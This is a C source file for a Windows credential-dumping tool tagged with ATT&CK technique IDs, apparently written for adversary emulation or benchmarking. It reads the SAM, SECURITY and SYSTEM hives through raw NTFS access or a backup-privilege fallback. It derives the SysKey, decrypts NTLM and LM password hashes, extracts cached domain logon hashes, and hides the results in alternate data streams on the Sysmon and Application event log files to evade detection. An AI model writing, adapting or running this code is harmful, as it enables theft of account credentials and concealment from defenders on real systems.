// Plan 2 — SAM + LSA Secrets + MSCache v2 Dump (T1003.002/004/005)
// Raw NTFS volume read → offline hive parse → SysKey decrypt → ADS output
#include "../shared/common.h"

// SysKey permutation table
static const BYTE g_SysKeyPerm[16] = {
    0x08,0x05,0x04,0x02,0x0B,0x09,0x0D,0x03,0x00,0x06,0x01,0x0C,0x0E,0x0A,0x0F,0x07
};

// ─── Get value from registry hive buffer (vk signature scan) ───
static BOOL GetRegValue(PBYTE hive, SIZE_T size, PWSTR name, PBYTE* val, PDWORD valSize) {
    SIZE_T nl = wcslen(name) * 2;
    for (SIZE_T i = 0; i + nl + 20 < size; i++) {
        if (*(PWORD)(hive + i) == 0x6B76) { // "vk" signature
            if (*(PWORD)(hive + i + 2) != nl) continue;
            if (memcmp(hive + i + 0x14, name, nl) != 0) continue;
            *valSize = *(PDWORD)(hive + i + 4);
            DWORD off = *(PDWORD)(hive + i + 8);
            DWORD abs = 0x1000 + off + 4;
            if (abs + *valSize <= size) {
                *val = (PBYTE)malloc(*valSize + 4);
                if (*val) { memcpy(*val, hive + abs, *valSize); return TRUE; }
            }
        }
    }
    return FALSE;
}

// ─── Extract SysKey from SYSTEM hive ───
static BOOL ExtractSysKey(PBYTE sysData, SIZE_T sysSize, BYTE sysKey[16]) {
    const WCHAR* vals[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    BYTE raw[16] = {0};
    for (int i = 0; i < 4; i++) {
        PBYTE d = NULL; DWORD s = 0;
        if (!GetRegValue(sysData, sysSize, (PWSTR)vals[i], &d, &s) || s < 4) {
            if (d) free(d); return FALSE;
        }
        memcpy(raw + i * 4, d, 4); free(d);
    }
    for (int i = 0; i < 16; i++) sysKey[i] = raw[g_SysKeyPerm[i]];
    return TRUE;
}

// ─── Parse SAM: extract and decrypt NTLM hashes ───
static DWORD ParseSAM(PBYTE sam, SIZE_T sz, BYTE sysKey[16], NTLM_CRED** out) {
    DWORD cap = 64, cnt = 0;
    *out = (NTLM_CRED*)calloc(cap, sizeof(NTLM_CRED));
    if (!*out) return 0;

    for (SIZE_T i = 0; i + 0xE0 < sz; i++) {
        if (*(PDWORD)(sam + i) != 0x00000001) continue;

        DWORD ntlmOff = *(PDWORD)(sam + i + 0x0C);
        DWORD ntlmSize = *(PDWORD)(sam + i + 0x10);
        DWORD lmOff = *(PDWORD)(sam + i + 0x14);

        if (ntlmSize < 16 || ntlmOff < 0x80 || ntlmOff + 16 > sz) continue;

        // Decrypt: rc4_key = MD5(SysKey || RID_le || "NTPASSWORD\0" || SysKey)
        BYTE* encBlock = sam + i + ntlmOff;
        DWORD rid = *(PDWORD)(sam + i + 4);

        BYTE ck[64]; int co = 0;
        memcpy(ck + co, sysKey, 16); co += 16;
        ck[co++] = (BYTE)rid; ck[co++] = (BYTE)(rid>>8);
        ck[co++] = (BYTE)(rid>>16); ck[co++] = (BYTE)(rid>>24);
        memcpy(ck + co, "NTPASSWORD", 11); co += 11;
        memcpy(ck + co, sysKey, 16); co += 16;

        BYTE md5Hash[16]; md5(ck, co, md5Hash);

        if (cnt >= cap) { cap *= 2; *out = (NTLM_CRED*)realloc(*out, cap * sizeof(NTLM_CRED)); }
        NTLM_CRED* c = &(*out)[cnt];
        rc4(md5Hash, 16, encBlock, 16, c->ntlm);

        // LM hash
        BYTE ckl[64]; int clo = 0;
        memcpy(ckl + clo, sysKey, 16); clo += 16;
        ckl[clo++] = (BYTE)rid; ckl[clo++] = (BYTE)(rid>>8);
        ckl[clo++] = (BYTE)(rid>>16); ckl[clo++] = (BYTE)(rid>>24);
        memcpy(ckl + clo, "LMPASSWORD", 11); clo += 11;
        memcpy(ckl + clo, sysKey, 16); clo += 16;
        BYTE lmMd5[16]; md5(ckl, clo, lmMd5);
        rc4(lmMd5, 16, sam + i + lmOff, 16, c->lm);

        c->rid = rid;
        swprintf_s(c->name, 128, L"User_%d", rid);
        cnt++;
        i += 0xE0;
    }
    return cnt;
}

// ─── Parse SECURITY: MSCache v2 entries ───
static DWORD ParseMSCache(PBYTE sec, SIZE_T sz, WCHAR*** names, WCHAR*** domains, PBYTE** hashes) {
    DWORD cap = 32, cnt = 0;
    *names = (WCHAR**)calloc(cap, sizeof(WCHAR*));
    *domains = (WCHAR**)calloc(cap, sizeof(WCHAR*));
    *hashes = (PBYTE*)calloc(cap, sizeof(PBYTE));
    if (!*names || !*domains || !*hashes) return 0;

    WCHAR vn[16];
    for (int n = 1; n <= 100; n++) {
        swprintf_s(vn, 16, L"NL$%d", n);
        PBYTE d = NULL; DWORD s = 0;
        if (!GetRegValue(sec, sz, vn, &d, &s) || s < 0x70) { if (d) free(d); continue; }

        if (cnt >= cap) {
            cap *= 2; *names = (WCHAR**)realloc(*names, cap * sizeof(WCHAR*));
            *domains = (WCHAR**)realloc(*domains, cap * sizeof(WCHAR*));
            *hashes = (PBYTE*)realloc(*hashes, cap * sizeof(PBYTE));
        }

        (*hashes)[cnt] = (PBYTE)malloc(16);
        memcpy((*hashes)[cnt], d + 0x60, 16);

        PWSTR uname = (PWSTR)(d + 0x70);
        DWORD ul = 0; while (uname[ul] && ul < 127 && (PBYTE)(uname + ul) < d + s) ul++;
        (*names)[cnt] = (WCHAR*)malloc((ul + 1) * 2);
        memcpy((*names)[cnt], uname, ul * 2); (*names)[cnt][ul] = 0;

        PWSTR dom = (PWSTR)(d + 0x70 + (ul + 1) * 2);
        DWORD dl = 0; while (dom[dl] && dl < 127 && (PBYTE)(dom + dl) < d + s) dl++;
        (*domains)[cnt] = (WCHAR*)malloc((dl + 1) * 2);
        memcpy((*domains)[cnt], dom, dl * 2); (*domains)[cnt][dl] = 0;

        cnt++; free(d);
    }
    return cnt;
}

// ─── Fallback path: save hives via RegSaveKey (SE_BACKUP_NAME) ───
// Works on any filesystem (ReFS etc.) where raw NTFS parsing is unavailable.

static BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return FALSE;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
        CloseHandle(hTok); return FALSE;
    }
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    SetLastError(ERROR_SUCCESS);
    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hTok);
    // ERROR_NOT_ALL_ASSIGNED (1300) = privilege not present in token (not admin)
    return ok && err != ERROR_NOT_ALL_ASSIGNED;
}

static BOOL ReadHiveFile(PWSTR path, HIVE_DATA* h) {
    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    DWORD sz = GetFileSize(hf, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(hf); return FALSE; }
    // VirtualAlloc so FreeHiveData() (VirtualFree) can release it later
    h->data = (PBYTE)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!h->data) { CloseHandle(hf); return FALSE; }
    DWORD rd = 0;
    BOOL ok = ReadFile(hf, h->data, sz, &rd, NULL) && rd == sz;
    CloseHandle(hf);
    if (!ok) { VirtualFree(h->data, 0, MEM_RELEASE); h->data = NULL; return FALSE; }
    h->size = sz;
    return TRUE;
}

static BOOL FallbackSaveHives(HIVE_DATA* sam, HIVE_DATA* sec, HIVE_DATA* sys) {
    // NOTE: explicit wide literals — SE_BACKUP_NAME is narrow unless UNICODE is
    // defined, and these builds don't define it (caused err 1313 NO_SUCH_PRIVILEGE)
    if (!EnablePrivilege(L"SeBackupPrivilege") || !EnablePrivilege(L"SeRestorePrivilege")) {
        wprintf(L"      [ERR] Failed to enable backup privileges (err=%d)\n", GetLastError());
        return FALSE;
    }

    WCHAR tmpDir[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tmpDir)) return FALSE;

    struct { PCWSTR sub; PCWSTR fname; HIVE_DATA* out; } jobs[] = {
        { L"SAM",      L"bench_sam.hive",      sam },
        { L"SECURITY", L"bench_security.hive", sec },
        { L"SYSTEM",   L"bench_system.hive",   sys },
    };

    BOOL allOk = TRUE;
    for (int i = 0; i < 3; i++) {
        WCHAR path[MAX_PATH];
        swprintf_s(path, MAX_PATH, L"%ls%ls", tmpDir, jobs[i].fname);

        HKEY hKey = NULL;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, jobs[i].sub, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS) {
            wprintf(L"      [ERR] RegOpenKeyEx %s failed\n", jobs[i].sub);
            allOk = FALSE;
            continue;
        }
        LSTATUS lr = RegSaveKeyW(hKey, path, NULL);
        RegCloseKey(hKey);
        if (lr != ERROR_SUCCESS) {
            wprintf(L"      [ERR] RegSaveKey %s failed (err=%d)\n", jobs[i].sub, lr);
            allOk = FALSE;
            continue;
        }
        if (!ReadHiveFile(path, jobs[i].out)) {
            wprintf(L"      [ERR] ReadHiveFile %s failed\n", jobs[i].fname);
            allOk = FALSE;
        }
        DeleteFileW(path);
    }
    return allOk;
}

// ─── Main ───
int wmain(void) {
    wprintf(L"[*] SAM+LSA+MSCache Dump — T1003.002/004/005\n");

    // 1. Open raw NTFS volume (raw NTFS may be unavailable: BitLocker, ReFS...)
    wprintf(L"[1] Opening \\\\.\\C:... ");
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, NULL);
    if (hVol == INVALID_HANDLE_VALUE) { wprintf(L"FAILED\n"); return 1; }

    HIVE_DATA sam = {0}, sec = {0}, sys = {0};
    BOOL s1 = FALSE, s2 = FALSE, s3 = FALSE;
    BOOL rawOk = FALSE;

    NTFS_CONTEXT ctx;
    if (ParseNtfsBoot(hVol, &ctx)) {
        wprintf(L"OK (cluster=%d)\n", ctx.clusterSize);

        // 2. Read MFT
        wprintf(L"[2] Reading MFT... ");
        PBYTE mft = NULL; SIZE_T mftSz = 0;
        if (ReadMft(hVol, &ctx, &mft, &mftSz)) {
            wprintf(L"OK (%lld MB)\n", mftSz / 1024 / 1024);

            // 3. Extract hives
            wprintf(L"[3] Extracting SAM/SECURITY/SYSTEM... ");
            s1 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
                L"\\Windows\\System32\\config\\SAM", &sam);
            s2 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
                L"\\Windows\\System32\\config\\SECURITY", &sec);
            s3 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
                L"\\Windows\\System32\\config\\SYSTEM", &sys);
            VirtualFree(mft, 0, MEM_RELEASE);
            wprintf(L"%s/%s/%s (%lld/%lld/%lld bytes)\n",
                s1?L"SAM":L"FAIL", s2?L"SEC":L"FAIL", s3?L"SYS":L"FAIL",
                sam.size, sec.size, sys.size);
            rawOk = s1 && s3;
        } else {
            wprintf(L"FAILED\n");
        }
    } else {
        wprintf(L"Not NTFS\n");
    }
    CloseHandle(hVol);

    if (!rawOk) {
        wprintf(L"      [i] Raw NTFS failed — falling back to RegSaveKey (backup privilege)...\n");
        FreeHiveData(&sam); FreeHiveData(&sec); FreeHiveData(&sys);
        if (!FallbackSaveHives(&sam, &sec, &sys)) {
            wprintf(L"      [ERR] Fallback also failed\n");
            return 1;
        }
        s1 = sam.data != NULL; s2 = sec.data != NULL; s3 = sys.data != NULL;
    }

    // 4. Extract SysKey
    wprintf(L"[4] Extracting SysKey... ");
    BYTE sysKey[16];
    if (!ExtractSysKey(sys.data, sys.size, sysKey)) { wprintf(L"FAILED\n"); return 1; }
    wprintf(L"OK\n");

    // 5. Parse SAM → NTLM hashes
    wprintf(L"[5] Parsing SAM... ");
    NTLM_CRED* creds = NULL;
    DWORD userCnt = ParseSAM(sam.data, sam.size, sysKey, &creds);
    wprintf(L"%d users\n", userCnt);

    // 6. Parse MSCache
    DWORD cacheCnt = 0;
    WCHAR** cacheNames = NULL, **cacheDoms = NULL;
    PBYTE* cacheHashes = NULL;
    if (s2) {
        wprintf(L"[6] Parsing MSCache v2... ");
        cacheCnt = ParseMSCache(sec.data, sec.size, &cacheNames, &cacheDoms, &cacheHashes);
        wprintf(L"%d entries\n", cacheCnt);
    } else {
        wprintf(L"[6] MSCache: skipped (no SECURITY hive)\n");
    }

    // 7. Serialize + encrypt + ADS
    wprintf(L"[7] Writing output to ADS... ");
    SIZE_T blobSize = 256 + userCnt * 64 + cacheCnt * 600;
    PBYTE blob = (PBYTE)malloc(blobSize);
    if (blob) {
        PBYTE bp = blob;
        memcpy(bp, "LSAM", 4); bp += 4;
        *(PDWORD)bp = 2; bp += 4;
        *(PDWORD)bp = userCnt; bp += 4;
        *(PDWORD)bp = cacheCnt; bp += 4;

        for (DWORD i = 0; i < userCnt; i++) {
            *(PDWORD)bp = creds[i].rid; bp += 4;
            WORD nl = (WORD)(wcslen(creds[i].name) * 2);
            *(PWORD)bp = nl; bp += 2;
            memcpy(bp, creds[i].name, nl); bp += nl;
            memcpy(bp, creds[i].ntlm, 16); bp += 16;
            memcpy(bp, creds[i].lm, 16); bp += 16;
        }
        for (DWORD i = 0; i < cacheCnt; i++) {
            WCHAR hc[512];
            WCHAR hx[33]; for (int j = 0; j < 16; j++)
                swprintf_s(hx + j * 2, 3, L"%02X", cacheHashes[i][j]);
            swprintf_s(hc, 512, L"$DCC2$10240#%s#%s#%s",
                cacheNames[i], cacheDoms[i]?cacheDoms[i]:L"", hx);
            WORD hl = (WORD)(wcslen(hc) * 2);
            *(PWORD)bp = hl; bp += 2;
            memcpy(bp, hc, hl); bp += hl;
        }
        blobSize = bp - blob;

        static WCHAR* targets[] = {
            L"C:\\Windows\\System32\\winevt\\Logs\\"
            L"Microsoft-Windows-Sysmon%4Operational.evtx",
            L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        };
        for (int i = 0; i < 2; i++) {
            if (WriteToAds(targets[i], L"SAM", blob, blobSize)) {
                wprintf(L"OK\n"); break;
            }
        }
        free(blob);
    }

    // Cleanup
    FreeHiveData(&sam); FreeHiveData(&sec); FreeHiveData(&sys);
    free(creds);
    for (DWORD i = 0; i < cacheCnt; i++) { free(cacheNames[i]); free(cacheDoms[i]); free(cacheHashes[i]); }
    free(cacheNames); free(cacheDoms); free(cacheHashes);

    wprintf(L"[+] %d users, %d cached logins\n", userCnt, cacheCnt);
    return 0;
}
